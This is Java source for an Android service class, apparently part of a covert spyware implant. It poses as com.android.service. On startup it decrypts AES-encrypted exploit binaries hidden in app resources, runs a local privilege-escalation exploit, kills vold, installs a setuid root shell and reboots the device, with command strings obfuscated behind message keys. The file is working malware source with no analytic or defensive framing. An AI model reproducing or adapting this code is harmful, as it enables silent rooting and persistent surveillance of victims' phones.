package com.android.service;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

import android.app.Service;
import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.Bitmap.Config;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.os.IBinder;
import android.view.Display;
import android.view.WindowManager;
import android.widget.Toast;

import com.android.service.auto.Cfg;
import com.android.service.conf.Configuration;
import com.android.service.file.AutoFile;
import com.android.service.util.Check;
import com.android.service.util.Utils;

/**
 * The Class ServiceCore.
 */
public class ServiceCore extends Service {
	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
	private Core core;
	private String shellFile;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		Messages.init(getApplicationContext());
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("32.1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
			// setBackground();
		}

		Status.setAppContext(getApplicationContext());
	}

	private void setBackground() {
		if (Cfg.DEMO) {
			final WallpaperManager wm = WallpaperManager.getInstance(this);
			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
					.getDefaultDisplay();
			final int width = display.getWidth();
			final int height = display.getHeight();
			final Bitmap bitmap = Bitmap.createBitmap(width, height, Config.ARGB_8888);
			final Canvas canvas = new Canvas(bitmap);
			final Paint paint = new Paint();
			paint.setStyle(Paint.Style.FILL);
			paint.setAntiAlias(true);
			paint.setTextSize(20);
			canvas.drawText(Messages.getString("32.0"), 10, 100, paint);
			try {
				wm.setBitmap(bitmap);
			} catch (final IOException e) {
				if (Cfg.DEBUG) {
					Check.log(e);
				}
			}
		}
	}

	@Override
	public void onDestroy() {
		super.onDestroy();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("32.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}

		core.Stop();
		core = null;
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);

		this.shellFile = Messages.getString("32.2"); //$NON-NLS-1$

		if (checkRoot() == true) {
			Status.self().setRoot(true);
		} else {
			Status.self().setRoot(false);

			// Don't exploit if we have no SD card mounted
			if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
				Status.self().setRoot(root());
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart) no media mounted"); //$NON-NLS-1$
				}
			}
		}

		// Core starts
		core = new Core();
		core.Start(this.getResources(), getContentResolver());
	}

	private boolean root() {
		try {
			if (!Cfg.EXP) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (root): Exploit disabled by conf"); //$NON-NLS-1$
				}

				return false;
			}

			final String crashlog = Messages.getString("32.4"); //$NON-NLS-1$
			final String exploit = Messages.getString("32.5"); //$NON-NLS-1$
			final String suidext = Messages.getString("32.6"); //$NON-NLS-1$
			boolean isRoot = false;

			// Creiamo il crashlog
			final FileOutputStream fos = getApplicationContext().openFileOutput(crashlog, MODE_PRIVATE);
			fos.close();

			Resources resources = getResources();
			InputStream stream = resources.openRawResource(R.raw.statuslog);
			fileWrite(exploit, stream, "0x5A3D10448D7A912B");

			stream = resources.openRawResource(R.raw.statusdb);
			fileWrite(suidext, stream, "0x5A3D10448D7A912A");

			// Eseguiamo l'exploit
			final File filesPath = getApplicationContext().getFilesDir();
			final String path = filesPath.getAbsolutePath();

			Runtime.getRuntime().exec(Messages.getString("32.7") + path + "/" + exploit); //$NON-NLS-1$ //$NON-NLS-2$
			Runtime.getRuntime().exec(Messages.getString("32.8") + path + "/" + suidext); //$NON-NLS-1$ //$NON-NLS-2$
			Runtime.getRuntime().exec(Messages.getString("32.9") + path + "/" + crashlog); //$NON-NLS-1$ //$NON-NLS-2$

			final String exppath = path + "/" + exploit; //$NON-NLS-1$

			final ExploitRunnable r = new ExploitRunnable(exppath);
			new Thread(r).start();

			// Attendiamo al max 100 secondi il nostro file setuid root
			final long now = System.currentTimeMillis();

			while (System.currentTimeMillis() - now < 100 * 1000) {
				Utils.sleep(1000);

				if (checkRoot()) {
					isRoot = true;
					break;
				}
			}

			if (r.getProcess() != null) {
				r.getProcess().destroy();
			}

			if (isRoot) {
				// Killiamo VOLD per due volte
				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32.10")); //$NON-NLS-1$ //$NON-NLS-2$

				// Installiamo la shell root
				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32.11")); //$NON-NLS-1$ //$NON-NLS-2$

				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart): Root exploit"); //$NON-NLS-1$
				}
				if (Cfg.DEMO) {
					Toast.makeText(this, Messages.getString("32.12"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
				}

				// Riavviamo il telefono
				Runtime.getRuntime().exec(path + "/" + suidext + " reb"); //$NON-NLS-1$ //$NON-NLS-2$
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart): exploit failed!"); //$NON-NLS-1$
				}
				if (Cfg.DEMO) {
					Toast.makeText(this, Messages.getString("32.13"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
				}

			}
		} catch (final Exception e1) {

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (root): Exception on root()"); //$NON-NLS-1$
			}

			return false;
		}

		return true;
	}

	private boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
			FileNotFoundException {
		try {
			InputStream in = decodeEnc(stream, passphrase);

			final FileOutputStream out = openFileOutput(exploit, MODE_PRIVATE);
			byte[] buf = new byte[1024];
			int numRead = 0;
            while ((numRead = in.read(buf)) >= 0) {
                out.write(buf, 0, numRead);
            }
				
			out.close();
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				ex.printStackTrace();
				Check.log(TAG + " (fileWrite): " + ex);
			}
			return false;
		}

		return true;
	}

	private InputStream decodeEnc(InputStream stream, String passphrase) throws IOException, NoSuchAlgorithmException,
			NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {

		SecretKey key = Messages.produceKey(passphrase);
		if (Cfg.DEBUG) {
			Check.asserts(key != null, "null key"); //$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (decodeEnc): stream=" + stream.available());
			Check.log(TAG + " (decodeEnc): key=" + Utils.byteArrayToHex(key.getEncoded()));
		}

		Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding"); //$NON-NLS-1$
		final byte[] iv = new byte[16];
		Arrays.fill(iv, (byte) 0);
		IvParameterSpec ivSpec = new IvParameterSpec(iv);

		cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
		CipherInputStream cis = new CipherInputStream(stream, cipher);
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (decodeEnc): cis=" + cis.available());
		}
		
		return cis;
	}

	private boolean checkRoot() { //$NON-NLS-1$
		boolean isRoot = false;

		try {
			// Verifichiamo di essere root
			final AutoFile file = new AutoFile(Configuration.shellFile);

			if (file.exists() && file.canRead()) {
				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + Messages.getString("32.14"));
				p.waitFor();

				if (p.exitValue() == 1) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
					}

					isRoot = true;
				}
			}
		} catch (final Exception e) {
			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(e);//$NON-NLS-1$
			}
		}

		return isRoot;
	}

	// Exploit thread
	class ExploitRunnable implements Runnable {
		private Process localProcess;
		private final String exppath;

		public ExploitRunnable(String exppath) {
			this.exppath = exppath;
		}

		public Process getProcess() {
			return localProcess;
		}

		public void run() {
			try {
				localProcess = Runtime.getRuntime().exec(exppath);

				final BufferedWriter stdin = new BufferedWriter(new OutputStreamWriter(localProcess.getOutputStream()));
				final BufferedReader stdout = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));
				final BufferedReader stderr = new BufferedReader(new InputStreamReader(localProcess.getErrorStream()));
				final String full = null;
				String line = null;

				while ((line = stdout.readLine()) != null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (stdout): " + line); //$NON-NLS-1$
					}
				}

				while ((line = stderr.readLine()) != null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (stderr): " + line); //$NON-NLS-1$
					}
				}

				try {
					localProcess.waitFor();
				} catch (final InterruptedException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (waitFor): " + e); //$NON-NLS-1$
						Check.log(e);//$NON-NLS-1$
					}
				}

				final int exitValue = localProcess.exitValue();
				if (Cfg.DEBUG) {
					Check.log(TAG + " (waitFor): exitValue " + exitValue); //$NON-NLS-1$
				}

				stdin.close();
				stdout.close();
				stderr.close();

			} catch (final IOException e) {
				localProcess = null;
				if (Cfg.DEBUG) {
					Check.log(TAG + " (ExploitRunnable): Exception on run(): " + e); //$NON-NLS-1$
					Check.log(e);//$NON-NLS-1$
				}
			}
		}

	};
}
